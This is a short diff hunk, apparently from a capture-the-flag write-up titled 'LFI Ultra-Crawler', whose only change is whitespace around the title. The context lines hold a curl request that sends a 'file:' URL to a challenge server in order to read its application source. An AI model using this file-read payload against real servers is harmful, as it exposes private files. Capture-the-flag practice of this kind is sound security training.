@@ -9,4 +9,5 @@ curl -X POST \
 -H 'Host: company.tld' \
 --data 'url=file:/home/ctf/app.py' \
 http://34.141.113.155:32567/
-                                                  LFI  Ultra-Crawler
+
+                                                   LFI  Ultra-Crawler
